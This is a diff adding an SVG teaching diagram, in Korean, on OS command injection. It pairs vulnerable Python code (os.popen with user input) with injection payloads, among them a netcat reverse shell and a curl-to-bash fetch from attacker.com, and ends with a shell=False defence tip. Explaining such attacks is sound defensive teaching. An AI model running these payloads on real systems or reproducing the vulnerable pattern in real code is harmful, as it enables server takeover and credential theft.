@@ -1,0 +1,53 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="460" viewBox="0 0 880 460">
+  <rect width="880" height="460" fill="#0a0a0a" rx="12"/>
+  <defs>
+    <marker id="arr" viewBox="0 0 14 14" refX="12" refY="7"
+            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
+      <path d="M 0 0 L 13 7 L 0 14 z" fill="#e05555"/>
+    </marker>
+  </defs>
+
+  <text x="440" y="46" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="22" font-weight="700" fill="#e8e8e8">커맨드 인젝션 공격 패턴</text>
+  <text x="440" y="72" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" fill="#888">OS Shell 명령어가 사용자 입력을 그대로 해석할 때 발생</text>
+
+  <!-- Attack scenario -->
+  <rect x="60" y="96" width="760" height="74" rx="8" fill="#000000" stroke="#e05555" stroke-width="1.5"/>
+  <text xml:space="preserve" x="80" y="120" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># 취약한 Python 서버 코드</text>
+  <text xml:space="preserve" x="80" y="140" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#7ec8e3" font-weight="600">import</text>
+  <text xml:space="preserve" x="130" y="140" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#ffffff"> os</text>
+  <text xml:space="preserve" x="80" y="160" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">result = os.popen(f"ping -c 1 {host}").read()</text>
+  <text xml:space="preserve" x="580" y="160" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8">  # host = req input</text>
+
+  <!-- Injection payloads -->
+  <text x="440" y="200" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#e8e8e8">쉘 메타문자를 이용한 명령어 연결</text>
+
+  <rect x="60" y="216" width="360" height="188" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1.5"/>
+  <text xml:space="preserve" x="80" y="240" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># ; 으로 추가 명령 실행</text>
+  <text xml:space="preserve" x="80" y="260" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">8.8.8.8; cat /etc/passwd</text>
+  <text xml:space="preserve" x="80" y="280" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># &amp;&amp; (앞 성공 시 실행)</text>
+  <text xml:space="preserve" x="80" y="300" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">8.8.8.8 &amp;&amp; id &amp;&amp; whoami</text>
+  <text xml:space="preserve" x="80" y="320" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># | 파이프</text>
+  <text xml:space="preserve" x="80" y="340" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">8.8.8.8 | nc attacker.com 4444 -e /bin/sh</text>
+  <text xml:space="preserve" x="80" y="360" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># 백틱 / $() 치환</text>
+  <text xml:space="preserve" x="80" y="380" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#e05555">$(curl attacker.com/shell.sh | bash)</text>
+  <text xml:space="preserve" x="80" y="400" font-family="'JetBrains Mono','Menlo','Consolas',monospace" font-size="12" fill="#9aa4b8"># 개행문자 우회</text>
+
+  <!-- Right: Impact -->
+  <rect x="460" y="216" width="360" height="188" rx="8" fill="#1a0f0f" stroke="#e05555" stroke-width="1.5"/>
+  <text x="640" y="244" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="14" font-weight="600" fill="#e05555">공격 영향</text>
+
+  <text x="640" y="272" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" font-weight="600" fill="#e8e8e8">원격 코드 실행 (RCE)</text>
+  <text x="640" y="292" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#888">서버 완전 장악</text>
+
+  <text x="640" y="316" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" font-weight="600" fill="#e8e8e8">리버스 쉘</text>
+  <text x="640" y="336" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#888">지속적 원격 접근</text>
+
+  <text x="640" y="360" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="13" font-weight="600" fill="#e8e8e8">파일 시스템 접근</text>
+  <text x="640" y="380" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#888">/etc/shadow, 비밀키 탈취</text>
+
+  <text x="640" y="400" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#e05555">★ 가장 심각한 인젝션 유형</text>
+
+  <!-- Defense hint -->
+  <rect x="60" y="420" width="760" height="28" rx="6" fill="#0f1a0f" stroke="#55c555" stroke-width="1"/>
+  <text x="440" y="438" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif" font-size="12" fill="#55c555">방어: subprocess.run(args_list) + shell=False — 사용자 입력을 절대 쉘에 직접 전달하지 말 것</text>
+</svg>
